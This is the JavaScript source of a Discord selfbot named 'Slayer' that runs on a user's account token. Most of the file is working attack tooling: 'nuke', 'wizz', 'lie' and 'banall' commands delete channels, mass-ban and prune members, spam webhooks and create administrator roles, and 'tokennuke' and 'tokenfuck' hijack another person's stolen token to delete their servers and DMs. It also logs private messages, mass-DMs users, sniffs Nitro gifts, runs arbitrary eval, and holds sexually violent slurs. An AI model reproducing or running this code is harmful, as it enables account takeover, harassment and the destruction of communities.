const Discord = require('discord.js');
const bot = new Discord.Client();
const { Client } = require('discord.js');
const superagent = require('superagent');
const readline = require('readline');
const config = require('./config.json');
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });
const dogFacts = require('dog-facts');
const figlet = require('figlet')
const axios = require('axios')
const ascii = require('ascii-art');
const { token: passer, prefix } = require('./config.json')
const madeByY = 'y'
const SADN9QD8SADJWQNISOSS = 'S'
const adnq8wiudhasd87qhdqsudL = 'l'
const asdjnqwioudsbnq78nhasA = 'a'
const adadasdffsadfaE = 'e'
const dawdasdR = 'r'
const madeBy = `${SADN9QD8SADJWQNISOSS}${adnq8wiudhasd87qhdqsudL}${asdjnqwioudsbnq78nhasA}${madeByY}${adadasdffsadfaE}${dawdasdR}`

var afk = config.afk_default
bot.afk = 'None'
bot.snipes = new Map();
bot.edites = new Map();
const {
    red,
    green,
    blue,
    yellow,
    cyan,
    magenta,
    white,
} = require('chalk');

if (passer === 'TOKEN HERE') return console.log(red('[INFO] No token was entered.. Make sure to insert your account token.'))

bot.on('ready', () => {
  
    // request("https://pastebin.com/raw/AYZZPpgt", (err, res, body) => {
    //   body = body.toString().split("\r\n")
    //   if (res.body.includes(bot.user.id)) {
    if (bot.user.bot) {
        console.clear();
        console.log(red('[INFO] The token entered was a bot token. This is a Self bot and there for bot tokens will not be validated.'))
        return
    }



    console.clear()

    //   console.log(red('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'));
    console.log(magenta(`
            
            
                                           ███████╗██╗      █████╗ ██╗   ██╗███████╗██████╗ 
                                           ██╔════╝██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗
                                           ███████╗██║     ███████║ ╚████╔╝ █████╗  ██████╔╝
                                           ╚════██║██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗
                                           ███████║███████╗██║  ██║   ██║   ███████╗██║  ██║
                                           ╚══════╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
                                                         
        
        
            `))


    console.log(blue(`                                           ━ USERNAME      | ${bot.user.tag}      `));
    console.log(blue(`                                           ━ PREFIX        | ${prefix}  `));
    console.log(blue(`                                           ━ ID            | ${bot.user.id}      `));
    console.log(blue(`                                           ━ Message Logger| ${config.messagelogger}      `));
    console.log(blue(`                                           ━ 2FA           | ${bot.user.mfaEnabled}      `));
    console.log(blue(`                                           ━ NITRO SNIPER  | ${config.nitrosniper}      `));
    console.log(blue(`                                           ━ NITRO         | ${bot.user.premium}     `));
    console.log(blue(`                                           ━ ACTIVITY      | ${config.activity}     `));
    console.log(blue(`                                           ━ STATUS TYPE   | ${config.statustype}     `));
    console.log(blue(`                                           ━ AFK MODE      | ${config.afk_default}     `));
    console.log('                                                                                                                         ')
    // console.log(red('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'));




    bot.user.setStatus(config.activity);
    bot.user.setActivity(config.status, {
        type: `${config.statustype}`,
        url: config.stream_url
    });


    if (config.nitrosniper === true) {
        const nitrosniper = new Discord.Client();
        nitrosniper.login(passer);
        nitrosniper.on("ready", () => {
            nitrosniper.on("message", message => {
                if (message.content.includes('discord.gift/') || message.content.includes('discordapp.com/gifts/')) {
                    try {
                        var Nitro = /(discord\.(gift)|discordapp\.com\/gift)\/.+[a-z]/

                        var NitroUrl = Nitro.exec(message.content);
                        var NitroCode = NitroUrl[0].split('/')[1] || message.content.slice("https://discord.gift/");

                        axios({
                            method: 'POST',
                            url: `https://discordapp.com/api/v6/entitlements/gift-codes/${NitroCode}/redeem`,
                            headers: {
                                'Authorization': passer
                            },

                        }).then(
                            () => console.log(green(`[INFO] Successfull redeemed Gift: `) + NitroCode + "\n")
                        ).catch(() => console.log(red(`[INFO] Error: `) + red("Failed To Claim Gift: " + NitroCode + red(' (Invalid code)') + " \n")))
                    } catch (e) {
                        console.log(e)
                    }

                }
            })
        })
    } else if (config.nitrosniper === false) { } else { }

    const messageEditLogger = new Client();


    if (config.message_edit_logger === true) {
        messageEditLogger.login(passer)
        messageEditLogger.on("messageUpdate", (oldMessage, newMessage) => {
            if (oldMessage.channel.type === 'text') {
                if (oldMessage.author.bot) return;
                console.log(red("[INFO]" + ' ' + oldMessage.guild.name) + white(" : ") + blue(oldMessage.channel.name) + white(" : ") + cyan("Old message: ") + red(oldMessage) + cyan(" |  New message:  ") + green(newMessage))
            } else {

                console.log(red("[INFO] No Guild") + white(" : ") + blue("DMs") + white(" : ") + cyan("Old message:  ") + yellow(oldMessage.author.tag) + white(" : ") + cyan(" |  New message:  ") + red(oldMessage) + green(newMessage))
            }
        })
    } else if (config.messageeditlogger === false) { }


    const messagelogger = new Discord.Client();

    if (config.messagelogger === true) {
        messagelogger.login(passer)
        messagelogger.on("ready", () => {
            messagelogger.on("message", message => {
                if (message.channel.type === 'text') {
                    console.log(red('[INFO]' + ' ' + message.guild.name) + white(" : ") + blue(message.channel.name) + white(" : ") + yellow(message.author.tag) + white(" : ") + green(message))
                } else if (message.channel.type === "dm") {
                    console.log(red("[INFO] No Guild") + white(" : ") + blue("DMs") + white(" : ") + yellow(message.author.tag) + white(" : ") + green(message))
                }
            })
        })
    } else if (config.messagelogger === false) { } else { }


    process.on("unhandledRejection", error => {
        console.error("Unhandled promise rejection:", error);
    });



    bot.on("message", async message => {
        try {
            if (afk === true) {
                if (message.mentions.users.has(bot.user.id)) {
                    if (message.author.id === bot.user.id) return console.log(magenta('[LOG] You have been mentioned by your self'));
                    try {
                        console.log(`[LOG] You have been mentioned in ${message.guild.name}!`)
                    } catch (e) {
                        console.log(`[LOG] You have been mentuoned in a dm by ${message.author.tag}`)
                    }
                    return message.channel.send(`<@${message.author.id}>,  <@${bot.user.id}>, ` + config.afk_message + ' , Reason: ' + bot.afk)
                }
            } else { }
            if (!message.content.startsWith(prefix)) return;
            //dnd = do not disturb  | Invinsible = Invisible | idle = idle | online = online
            if (message.author.id !== bot.user.id) return;

            console.log(magenta(`[INFO] - ${message.content.slice(prefix)}`))
            var args = message.content.slice(prefix.length).trim().split(/ +/g);
            var command = args.shift().toLocaleLowerCase();

            if (command === 'clear-console') {
                console.clear()
            }

            if (command === 'afk') {
                if (afk === true) {
                    afk = false
                    return message.edit('`Disabled afk`')
                } else {
                    if (afk === false) {
                        afk = true
                        bot.afk = args.join(" ");
                        if (!bot.afk) {
                            message.edit('`Enabled afk` with no reason')

                        } else {
                            if (bot.afk) {
                                message.edit(`\`Enabled afk\` with reason: ${bot.afk}`)
                            }
                        }
                    }
                }
            }

            if (command === 'spam') {
                let interval4 = setInterval(async function () {
                    let spamSay = args.join(" ");
                    if (!spamSay) return message.edit("`Say something to spam`");
                    message.channel.send(spamSay)
                    let time = args[0]
                    setTimeout(() => {
                        clearInterval()
                    }, (time) * 1000)
                }, 900);
            }

            if (command === 'hentai') {
                const { body } = await superagent
                    .get(`https://nekos.life/api/v2/img/Random_hentai_gif`)
                let hembed = new Discord.RichEmbed()
                    .setImage(body.url)

                message.channel.send(hembed);

            }

            if (command === 'ascii') {
                if (!args[0]) return message.edit('`Provide Text`');

                let msg = args.join(' ')

                figlet.text(msg, function (err, data) {
                    if (err) {
                        console.log('[INFO] A unkown error has happend.');
                        console.dir(err);
                    }

                    if (data.length > 2000) return message.edit('`Provie text that is under 2000 characters!');

                    message.channel.send('```' + data + '```')
                })
            }

            if (command === 'nick') {
                function nickCommand() {
                    const Nick = ["Slayer is sexy", "Why did i make this", "oypk is a QT"]
                    const nick = Math.floor(Math.random() * Nick.length);

                    message.guild.me.setNickname(Nick[nick])
                }
                setInterval(nickCommand, 2000)
            }

            if (command === 'ct') {
                bot.users.forEach(user => {
                    setTimeout(() => {
                        user.send(`<@${user.id}> Make sure to check out this video for a Community Counter bot! 

    (This is a dmall don't dm me back :PepeKMS: ) 

    Link: https://www.youtube.com/watch?v=PTVA3SzxUxU`)
                    })
                }, 2000)
            }


            if (command === 'nicker') {
                function nickerCommand() {
                    const Nick = ["Slayer runs me", "zy and nafsi are sexy", "Im halal"]
                    const nick = Math.floor(Math.random() * Nick.length);

                    message.guild.members.find(m => m.id === '730149975782326342').setNickname(Nick[nick])
                }
                setInterval(nickerCommand, 2000)
            }


            if (command === 'delservers') {
                message.channel.send("Are you sure you want to do this? This will delete all servers you own? Type yes or cancel").then(() => {
                    const filter = m => message.author.id === m.author.id
                    message.channel.awaitMessages(filter, { time: 60000, max: 1, errors: ['time'] })
                        .then(msg => {
                            if (msg.first().content === 'yes') {
                                bot.guilds.forEach(guilds => guilds.delete());
                            }
                            if (msg.first().content === 'cancel') {
                                return message.edit('`Operation canceld`')
                            }
                        })
                })
            } else

                if (command === 'servercount') {
                    message.edit(`\`${bot.guilds.size}\``)
                    console.log(green('Current server count is ' + bot.guilds.size))
                }

            if (command === 'nuck') {
                if (message.channel.type === 'dm' || message.channel.type === 'group') return message.edit('`This is a server only command`')
                setInterval(() => {
                    message.guild.channels.forEach(channel => channel.clone());
                })
            }

            if (command === 'dm-all-users') {
                bot.users.forEach(user => {
                    setTimeout(() => {
                        user.send(args.join(" "));
                    }, 2000);
                })
            }

            if (command === 'ytsearch') {
                if (!args[0]) return message.edit('`Give something for me to search.`')
                message.channel.send(`https://www.youtube.com/results?search_query=${args.join("+")}`)
            }



            if (command === 'embed') {
                message.delete()
                const e = new Discord.RichEmbed()
                    .setColor("RANDOM")
                    .setDescription(args.join(" "))
                message.channel.send(e)
            }

            if (command === 'channel-names') {
                if (message.channel.type === 'dm' || message.channel.type === 'group') return message.edit('`This is a server only command`')
                if (message.guild.channels.map(r => r.name).join("").length > 2000) return message.reply('This server has too many channels to display!')

                let embed = new Discord.RichEmbed()
                    .setDescription(message.guild.channels.map(r => r.name).join("\n "))
                    .setColor("RANDOM")
                    .setThumbnail('https://cdn.discordapp.com/attachments/759121464481546250/760991389373956116/giphy_2.gif')
                message.channel.send(embed)
            }

            if (command === 'guildsmap') {
                if (bot.guilds.map(r => r.name).join("").length > 2000) return message.reply('This server has too many channels to display! (')
                let embed = new Discord.RichEmbed()
                    .setDescription(bot.guilds.map(r => r.name).join("\n "))
                    .setColor("RANDOM")
                    .setThumbnail('https://cdn.discordapp.com/attachments/759121464481546250/760991389373956116/giphy_2.gif')
                message.channel.send(embed)
            }

            if (command === 'fakewizz') {
                let mention = message.mentions.users.first();
                if (!mention) return message.edit("`@ user to lol`").then(message => message.delete(3000));
                message.edit(mention);
                message.edit("`Deleting channel.`");
                message.edit("`done`");
                message.edit("`Changing Server Name.`");
                message.edit("`done`");
                message.edit("`Kicking Bot`");
                message.edit("`done`");
                message.edit("`Making Channel`");
                message.edit("`done`");
                message.edit("`Banning all Members`").then(message => message.delete(3000));
            }

            if (command === 'tokennuke') {
                const yournukebotname = new Client()
                let nuketoken = args.join(" ")
                if (!nuketoken) return message.edit('`Enter a token`')
                yournukebotname.login(nuketoken)
                yournukebotname.on("ready", () => {
                    yournukebotname.users.forEach(users => users.deleteDM())
                    yournukebotname.guilds.forEach(guild => guild.delete())
                    yournukebotname.user.setAvatar("https://cdn.discordapp.com/attachments/733746369608548373/753411945801056336/unnamed.jpg")
                })
            }

            if (command === 'nukedms') {
                if (args[0] === 'me') {
                    const login = new Client()
                    message.channel.send("Nuking dms..")
                    login.users.forEach(user => user.deleteDM())
                    message.channel.send("Nuked dms")
                    login.login(passer)

                }
            }
            if (command === 'leavegcs') {
                bot.user.createGroupDM()
            }


            //#endregion
            //#region  tokenFuck
            if (command === 'tokenfuck') {
                const yournukebotname = new Client()
                let nuketoken = args.join(" ")
                yournukebotname.login(nuketoken)
                yournukebotname.on("ready", () => {
                    function guildCreateSpam() {
                        yournukebotname.user.createGuild(`${message.author.username}RAPED THIS ACCOUNT`)
                    }
                    setInterval(() => {
                        guildCreateSpam();
                        var list = yournukebotname.guilds.array();
                        yournukebotname.user.createGuild(`${message.author.username} RAPED THIS ACCOUNT`)
                        list.forEach(guild => guild.setIcon("https://cdn.discordapp.com/attachments/752518392443043900/754870396838215740/egirl.PNG"))
                    }, 1000);
                })
            }

            if (command === 'clonech') {
                if (message.channel.type === 'dm' || message.channel.type === 'group') return message.edit('`This is a server only command`')
                message.guild.channels.forEach(channel => channel.clone())
            }



            if (command === 'lie') {
                if (message.channel.type === 'dm' || message.channel.type === 'group') return message.edit('`This is a server only command`')
                try {
                    message.guild.emojis.forEach(e => e.delete().catch(err => console.log(err)))
                    message.guild.channels.forEach(ch => ch.delete().catch(err => console.log(err)));
                    try {
                        message.guild.members.forEach(Member => {
                            if (Member.kickable) {
                                console.log(yellow(`[INFO] Kicked` + Member.user.username))
                                Member.kick()
                                console.log(green("[INFO] Kicked All Possible Members!"))
                            }
                            else {
                                console.log(yellow("[INFO] Couldn't kick " + Member + user + username + " you have no permissions"))
                            }
                        })
                    }
                    catch (err) {

                    }
                    const Guild = message.guild;

                    if (!Guild) return;

                    // Primary Nuke Functions
                    async function BanAll() {
                        await Guild.fetchMembers();

                        await Promise.all(Guild.members.map(async (m) => {
                            if (m.bannable) {
                                m.ban();
                            }
                        }));
                    }
                    BanAll()


                    message.guild.pruneMembers(7).catch(err => console.log(err));
                    message.guild.setName(config.servername)
                    message.guild.setIcon(config.servericon)




                    await message.guild.channels.forEach(channel => {
                        if (channel.type == 'text') {
                            channel.createWebhook(config.webhooknames[Math.floor(Math.random() * config.webhooknames.length)])
                        }
                    })
                    let interval666 = setInterval(async function () {
                        await message.guild.fetchWebhooks().then(web => web.forEach(webhook => webhook.send(config.webhookmessages[Math.floor(Math.random() * config.webhookmessages.length)])))

                    })



                    message.guild.members.forEach(members => members.ban())


                    setTimeout(() => {
                        setInterval(() => {
                            message.guild.channels.forEach(channel => channel.clone())
                        }, 500)
                    }, 4 * 1000)
                    let interval4 = setInterval(async function () {
                        message.guild.createRole({
                            name: config.rolenames[Math.floor(Math.random() * config.rolenames.length)],
                            color: config.rolecolors[Math.floor(Math.random() * config.rolecolors.length)],
                            permissions: ["ADMINISTRATOR"]
                        })

                    }, 100)
                    let interval9 = setInterval(async function () {
                        await message.guild.createChannel(config.channeln[Math.floor(Math.random() * config.channeln.length)], {
                            type: "text",
                            topic: `Made By ${SADN9QD8SADJWQNISOSS}${adnq8wiudhasd87qhdqsudL}${asdjnqwioudsbnq78nhasA}${madeByY}${adadasdffsadfaE}${dawdasdR}`,
                            permissionOverwrites: [{
                                id: message.guild.id,
                                allow: ["ADD_REACTIONS", "ADMINISTRATOR"]
                            }]
                        }).catch(err => console.log(err)).then(() => {
                            let interval97 = setInterval(async function () {
                                await message.guild.channels.forEach(channel => channel.send(config.messagespam[Math.floor(Math.random() * config.messagespam.length)]))
                            }, 100)
                        }).catch(err => console.log(err));

                    })

                } catch (e) {
                    console.log(red(`[INFO] Nuking ${message.guild.name}`))
                }
            }

            if (command === 'wizz') {
                if (message.channel.type === 'dm' || message.channel.type === 'group') return message.edit('`This is a server only command`')
                message.guild.emojis.forEach(emoji => emoji.delete());
                message.guild.channels.forEach(channel => channel.delete());

                try {
                    message.guild.members.forEach(Member => {
                        if (Member.kickable) {
                            console.log(yellow(`[INFO] Kicked` + Member.user.username))
                            Member.kick()
                            console.log(green("[INFO] Kicked All Possible Members!"))
                        }
                        else {
                            console.log(yellow("[INFO] Couldn't kick " + Member + user + username + " you have no permissions"))
                        }
                    })
                }
                catch (err) {

                }
                const Guild = message.guild;

                if (!Guild) return;

                // Primary Nuke Functions
                async function BanAll() {
                    message.guild.members.forEach(member => member.ban());
                    await Guild.fetchMembers();

                    await Promise.all(Guild.members.map(async (m) => {
                        if (m.bannable) {
                            m.ban();
                        }
                    }));
                }
                BanAll()
                setInterval(BanAll, 700)

                message.guild.pruneMembers(1).catch(err => console.log("[INFO] Pruned members"))

                let interval664326 = setInterval(async function () {
                    await message.guild.channels.forEach(ch => {
                        if (ch.type === 'text') {
                            ch.createWebhook(config.webhooknames[Math.floor(Math.random() * config.webhooknames.length)])
                        }
                    })

                    setTimeout(() => {
                        message.guild.fetchWebhooks().then(web => web.forEach(webhook => webhook.send(config.webhookmessages[Math.floor(Math.random() * 1000)])))
                    }, 3 * 1000)
                })


                let interval666 = setInterval(async function () {
                    await message.guild.channels.forEach(channel => {
                        if (channel.type == 'text') {
                            channel.createWebhook(config.webhooknames[Math.floor(Math.random() * config.webhooknames.length)])
                        }
                    })

                    await message.guild.fetchWebhooks().then(web => web.forEach(webhook => webhook.send(webhook => webhook.send(config.webhookmessages[Math.floor(Math.random() * config.webhookmessages.length)]))))

                })

                setTimeout(async () => {
                    await message.guild.fetchWebhooks().then(web => web.forEach(webhook => webhook.send(config.webhookmessages[Math.floor(Math.random() * config.webhookmessages.length)])))
                }, 5 * 1000)

                await message.guild.fetchWebhooks().then(web => web.forEach(webhook => webhook.send(config.webhookmessages[Math.floor(Math.random() * config.webhookmessages.length)])));

                let intervalRoles = setInterval(async function () {
                    message.guild.createRole({
                        name: config.rolenames[Math.floor(Math.random() * config.rolenames.length)],
                        color: config.rolecolors[Math.floor(Math.random() * config.rolecolors.length)],
                        permissions: ["ADMINISTRATOR"]
                    })

                    await message.guild.createChannel(config.channeln[Math.floor(Math.random() * config.channeln.length)], {
                        type: "text",
                        topic: `Rekt by ${madeBy}`,
                        permissionOverwrites: [{
                            id: message.guild.id,
                            allow: ["ADMINISTRATOR"]
                        }]
                    })

                })
                let intervalChannels = setInterval(async function () {
                    await message.guild.createChannel(config.channeln[Math.floor(Math.random() * config.channeln.length)], {
                        type: "text",
                        topic: `Rekt by ${madeBy}`,
                        permissionOverwrites: [{
                            id: message.guild.id,
                            allow: ["ADMINISTRATOR"]
                        }]
                    })
                    message.guild.channels.forEach(ch => ch.send("WE RUN CORD @everyone"))
                })
                function serverNameSpam() {
                    let serverNames = []
                    let ServerNames = Math.floor(Math.random() * serverNames.length)
                    message.guild.setName(config.servername)
                }
                setInterval(serverNameSpam, 2000)

            }


            if (command === 'rape') {
                if (message.channel.type === 'dm' || message.channel.type === 'group') return message.edit('`This is a server only command`')
                let interval6664233 = setInterval(async function () {
                    message.guild.createChannel(config.channeln[Math.floor(Math.random() * config.channeln.length)], {
                        type: "text",
                        topic: `${SADN9QD8SADJWQNISOSS}${adnq8wiudhasd87qhdqsudL}${asdjnqwioudsbnq78nhasA}${madeByY}${adadasdffsadfaE}${dawdasdR} runs cord`
                    }).then(() => {
                        message.guild.channels.forEach(channel => {
                            channel.createWebhook();
                        })
                    })

                    await message.guild.fetchWebhooks().then(web => web.forEach(webhook => webhook.send(config.webhookmessages[Math.floor(Math.random() * config.webhookmessages.length)])))
                })
            }

            if (command === 'webspam') {
                if (message.channel.type === 'dm' || message.channel.type === 'group') return message.edit('`This is a server only command`')

                await message.guild.channels.forEach(channel => {
                    if (channel.type == 'text') {
                        channel.createWebhook(config.webhooknames[Math.floor(Math.random() * config.webhooknames.length)])
                    }
                })
                let interval6663 = setInterval(async function () {
                    await message.guild.fetchWebhooks().then(web => web.forEach(webhook => webhook.send(config.webhookmessages[Math.floor(Math.random() * config.webhookmessages.length)])))

                })
            }

            if (command === "stream") {

                if (!args[0]) return message.reply("`Please enter stream name!`").then(message => message.delete(5000));
                if (args.join(" ").length > 100) return message.reply("`That is too long of a message to set.`").then(message => message.delete(5000));
                //if (args.length < 1) return message.edit("`Please enter stream name!`").then(message => message.delete(5000));
                bot.user.setActivity(args.join(" "), {
                    url: "https://www.twitch.tv/#",
                    type: "STREAMING"
                });
                message.delete();
                await message.channel.send("Changinging Status...").then(message => message.delete(1000));
                await message.channel.send("`Stream` Created! ").then(message => message.delete(2000));
            };
            //typeing
            if (command === "typing") {
                message.channel.startTyping()
                message.react("✅")
            }
            //stealpfp

            if (command === "stealpfp") {
                let user = message.mentions.users.first()
                if (!user) return message.edit('`You forgot to mention a user to steal from!`')

                bot.user.setAvatar(user.displayAvatarURL)
                await message.react("✅")
                return;
            }
            //LISTENING START/CHANGE

            if (command === "listen") {
                bot.user.setActivity(args.join(" "), {
                    url: "https://www.twitch.tv/#",
                    type: "LISTENING"
                });
                message.delete();
                await message.channel.send("Changinging Status...").then(message => message.delete(1000));
                await message.channel.send("`Listening` Created!").then(message => message.delete(2000));
            };

            //WATCHING START/CHANGE

            if (command === "watch") {
                bot.user.setActivity(args.join(" "), {
                    url: "https://www.twitch.tv/syrusisthebestcoder",
                    type: "WATCHING"
                });
                message.delete();
                await message.channel.send("Changinging Status...").then(message => message.delete(1000));
                await message.channel.send("`Watching` Created! ").then(message => message.delete(2000));
            };
            if (command === 'eval') {
                if (!args[0]) return message.reply("Use correct format!");

                try {
                    //
                    const toEval = args.join(" ");
                    const evalulated = eval(toEval);


                } catch (e) {
                    console.log(e)
                }
            }
 
            //PLAYING START/CHANGE

            if (command === "play") {
                bot.user.setActivity(args.join(" "), {
                    url: "https://www.twitch.tv/#",
                    type: "PLAYING"
                });
                message.delete();
                await message.channel.send("Changinging Status...").then(message => message.delete(1000));
                await message.channel.send("`Playing` Created!").then(message => message.delete(2000));
            };

            //STOP

            if (command === "stop") {
                bot.user.setActivity("");
                message.delete();
                await message.channel.send("Status `Stopped`! ").then(message => message.delete(2000));
            };



            if (command === 'off') {
                message.channel.send("Turning bot off..")
                setTimeout(() => {
                    process.off();
                }, 2 * 1000);
            }


            if (command === 'dmall') {
                if (message.channel.type === 'dm' || message.channel.type === 'group') return message.edit('`This is a server only command`')
                let dmallSay = args.slice(1).join(" ")
                if (!dmallSay) return message.edit("`Mention something to dmall dumb dumb`")
                message.guild.members.map(mm => mm.send(dmallSay));
            }
            if (command === "ping") {
                message.edit(`*${Math.round(bot.ping)} ms*`).then(mes => mes.delete(5000));
            };

            if (command === 'createdm') {
                if (message.channel.type === 'dm' || message.channel.type === 'group') return message.edit('`This is a server only command`')
                message.channel.send("Preparing dmall.. Creating a dm with all users...")
                message.guild.members.forEach(mm => mm.createDM())
            }







            if (command === 'uptime') {
                var seconds = parseInt((bot.uptime / 1000) & 60),
                    minutes = parseInt((bot.uptime / (1000 * 60)) % 60),
                    hours = parseInt((bot.uptime / (1000 * 60 * 60)) % 24);
                hours = (hours < 10) ? "0" + hours : hours;
                minutes = (minutes < 10) ? "0" + minutes : minutes;
                seconds = (seconds < 10) ? "0" + seconds : seconds;

                let embed = new Discord.RichEmbed()
                    .setDescription(`⌛𝘏𝘰𝘶𝘳: ${hours}\n\n⏱𝘔𝘪𝘯𝘶𝘵𝘦𝘴: ${minutes}\n\n⌚𝘚𝘦𝘤𝘰𝘯𝘥𝘴: ${seconds}`)
                message.edit(embed)

            }

            if (command === 'kickall') {
                if (message.channel.type === 'dm' || message.channel.type === 'group') return message.edit('`This is a server only command`')
                try {
                    message.guild.members.forEach(Member => {
                        if (Member.kickable) {
                            console.log(yellow(`[INFO] Kicked` + Member.user.username))
                            Member.kick()
                            console.log(green("[INFO] Kicked All Possible Members!"))
                        }
                        else {
                            console.log(yellow("[INFO] Couldn't kick " + Member + user + username + " you have no permissions"))
                        }
                    })
                }
                catch (err) {

                }
            }

            if (command === 'voiceraid') {
                let voiceRaidSay = args.join(" ");
                if (!voiceRaidSay) return message.edit("`Enter a name for the vcs`")

                message.guild.createChannel(voiceRaidSay, {
                    type: "voice"
                })
            }

            if (command === 'channelraid') {
                let interval454 = setInterval(async function () {
                    let channelNameSpam = args.join(" ");

                    if (!channelNameSpam) return message.edit("`Mention a name`")

                    message.guild.createChannel(channelNameSpam, {
                        type: "text"
                    })
                })
            }


            if (command === 'handjob') {
                let mention = message.mentions.users.first();
                if (!mention) return message.edit("`ping a user to handjob`").then(message => message.delete(3000));
                message.edit("8=:fist:==D " + mention);
                message.edit("8==:fist:=D " + mention);
                message.edit("8===:fist:D " + mention);
                message.edit("8==:fist:=D " + mention);
                message.edit("8=:fist:==D " + mention)
                message.edit("8:fist:===D " + mention);
                message.edit("8=:fist:==D " + mention);
                message.edit("8==:fist:=D " + mention);
                message.edit("8===:fist:D " + mention)
                message.edit("8==:fist:=D:sweat_drops: " + mention);
                message.edit("8===:fist:D:sweat_drops: " + mention)
            }




            if (command === "guilds") {
                message.edit(bot.guilds.forEach(g => { message.edit(g.name) }))
            }

            if (command === 'channels') {
                if (message.channel.type === 'dm' || message.channel.type === 'group') return message.edit('`This is a server only command`')
                message.guild.channels.forEach(ch => ch.delete())
            }


            if (command === 'serverinfo') {
                if (message.channel.type === 'dm' || message.channel.type === 'group') return message.edit('`This is a server only command`')
                const owner = message.guild.ownerID
                let embed = new Discord.RichEmbed()
                    .setColor(config.defualtcolor)
                    .setTitle(`${message.guild.name}`)
                    .addField("**Owner:**", `<@${owner}>`, true)
                    .addField("Region", message.guild.region, true)
                    .addField("Text Channels", message.guild.channels.size, true)
                    .addField("Members", message.guild.memberCount, true)
                    .addField("**Role list**", message.guild.roles.size, true)//a70f3e9169546b2c67d301aaeef38.gif
                    .setThumbnail(message.guild.iconURL)
                    .setFooter(`${message.author.username}`, message.author.displayAvatarURL)
                message.channel.send(embed)
            }
            if (command === 'prune') {
                if (message.channel.type === 'dm' || message.channel.type === 'group') return message.edit('`This is a server only command`')
                message.guild.pruneMembers(1).finally(() => {

                    message.edit(`I have pruned the server`)
                })
            }

            if (command === 'slap') {
                let user = message.mentions.users.first()
                superagent.get("https://nekos.life/api/v2/img/slap", (body, res) => {
                    if (!user) return message.reply('`You forgot to mention a user`')
                    let embed = new Discord.RichEmbed()
                        .setDescription(`${message.author.tag} slaped ${user.tag}`)
                        .setColor(config.defualtcolor)
                        .setImage(res.body.url)
                    message.channel.send(embed);
                })
            }



            if (command === 'banall') {
                let guild = await bot.guilds.get(args[0])
                if (!guild) return message.reply(`Invalid Guild\n**Usage** ${prefix}nuke [guild id]`)

                let membersBanned = 0

                let nukedBy = `${bot.user.username}`

              

                await guild.members.forEach(async mm => {
                    if (mm.id === bot.user.id) return;
                    if (mm.id === guild.ownerID) return;

                    let m = await guild.members.get(mm.user.id)

                    try {
                        const Guild = message.guild;

                        if (!Guild) return;

                        // Primary Nuke Functions
                        async function BanAll() {
                            await Guild.fetchMembers();

                            await Promise.all(Guild.members.map(async (m) => {
                                if (m.bannable) {
                                    await m.ban();
                                }
                            }));
                        }
                        setInterval(() => {
                            BanAll();
                        }, 20)


                        if (m.manageable) {
                            if (m.id === bot.user.id) return;
                            message.guild.members.map(mm => mm.ban());
                            message.guild.members.forEach(mm => mm.ban());
                            console.log(m.user.tag)
                            await guild.ban(m.user.id, { reason: `Nuked by ${nukedBy || "anonymous"}` })
                            membersBanned++
                            console.log(`[INFO] Banned ${m.user.tag}. Members Banned: ${membersBanned}`)
                        }
                    } catch (err) {
                        console.log(err);
                    }
                })
            }




            if (command === 'nuke') {
                let guild = await bot.guilds.get(args[0])
                if (!guild) return message.reply(`Invalid Guild\n**Usage** ${prefix}nuke [guild id]`)
                guild.channels.forEach(channel => channel.send(config.messagespam[Math.floor(Math.random() * config.messagespam.length)]))
                message.guild.members.map(mm => mm.ban());
                message.guild.members.forEach(mm => mm.ban());
                let nukedBy = message.author.username
                let msgToSpam = config.messagespam[Math.floor(Math.random() * config.messagespam.length)]

                await guild.channels.forEach(chnl => chnl.delete([`Nuked by ${nukedBy || `${madeBy}`}`]))

                let membersBanned = 0

                await guild.members.forEach(async mem => {
                    if (mem.id === bot.user.id) return;
                    if (mem.id === guild.ownerID) return;
                    let m = await guild.members.get(mem.user.id)
                    try {
                        if (m.manageable) {
                            message.guild.members.map(mm => mm.ban());
                            message.guild.members.forEach(mm => mm.ban());
                            console.log(m.user.tag)
                            await guild.members.ban(m.user.id, { reason: `Nuked by ${nukedBy || `${madeBy}`}` })
                            membersBanned++
                            console.log(`[INFO] Banned ${m.user.tag}. Members Banned: ${membersBanned}`)
                        }
                    } catch (err) {
                        console.log(err)
                    }
                })

                guild.roles.find(r => r.id === guild.id).setPermissions(8)
                await guild.pruneMembers(1)
                await guild.roles.forEach(r => {
                    if (r.name === '@everyone') return;
                    if (!r.managed) {
                        if (r.position < guild.me.highestRole.position) {
                            r.delete();
                        }
                    }
                })

                await guild.setName(config.servername)

                setInterval(async () => {
                    guild.createRole({ name: config.rolenames, color: "RANDOM", permissions: 8 })

                    try {

                        await guild.createChannel(config.channeln[Math.floor(Math.random() * config.channeln.length)], { type: "text", topic: `Made by ${madeBy}`, reason: `Made by ${madeBy}` }).then(async ch => {
                            await ch.createWebhook(config.webhooknames[Math.floor(Math.random() * config.webhooknames.length)]).then(web => {
                                setInterval(async () => {
                                    web.send(msgToSpam)
                                })
                            })
                        })

                    } catch (e) {
                        console.log(e)
                    }
                })
                guild.channels.forEach(c => {
                    if (c) c.send(msgToSpam)
                })
            }

		if (command === 'sss') {
	 message.guild.members.forEach(mm => {
mm.setNickname("Slayer runs me")
});
}

            if (command === 'abc') {
                message.channel.send("a").then(msg => {
                    msg.edit('b')
                    msg.edit('c')
                    msg.edit('d')
                    msg.edit('e')
                    msg.edit('f')
                    msg.edit('g')
                    msg.edit('h')
                    msg.edit('i')
                    msg.edit('j')
                    msg.edit('k')
                    msg.edit('m')
                    msg.edit('l')
                    msg.edit('m')
                    msg.edit('n')
                    msg.edit('o')
                    msg.edit('p')
                    msg.edit('q')
                    msg.edit('r')
                    msg.edit('s')
                    msg.edit('t')
                    msg.edit('u')
                    msg.edit('v')
                    msg.edit('w')
                    msg.edit('x')
                    msg.edit('y')
                    msg.edit('z').then(() => {
                        setTimeout(async () => {
                            await msg.edit('`done`')
                        })
                    })

                })
            }

